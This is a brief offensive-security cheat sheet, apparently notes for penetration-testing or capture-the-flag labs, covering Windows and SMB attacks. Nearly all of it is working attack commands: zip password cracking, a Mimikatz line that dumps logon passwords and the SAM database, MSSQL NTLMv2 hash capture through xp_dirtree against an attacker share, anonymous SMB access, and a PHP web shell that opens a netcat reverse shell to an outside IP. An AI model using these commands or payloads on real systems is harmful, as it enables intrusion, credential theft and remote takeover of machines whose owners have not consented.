# Cracking zip file
- `fcrackzip -v -u -D -p <wordlist> <ZIP FILE>`

# Mimikatz
`mimi.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"`

# Downloading from SMBClient
- turn prompt off using `prompt off`
- `recurse on`
- `mget *`

# Pulling down mssql NTLMv2 hash
start an smbserver and in the mssql console run `exec xp_dirtree '\\<attacker ip>\<share name>\',1,1` then check the smb server for the hash

# SMBClient
List shares: `smbclient -L \\\\<IP>\\`

Connect without a password: `smbclient --no-pass -N //<IP>/Backups`

# Mount remote share
`sudo apt install libguestfs-tools`

`sudo apt install cifs-utils`

`sudo mkdir /mnt/remote`

`mount -t cifs //<IP>/Backups /mnt/remote -o rw`

# SMBClient to shell

If you are able to access a share you can write to and that share is for a website then you can get a shell by uploading `nc.exe` to the share as well as a malicious `php` file with the following code:

```php
<?php system('nc.exe -e cmd.exe 10.10.14.12 9001') ?>
```

Go to the website and navigate to the `php` file while you have a listener running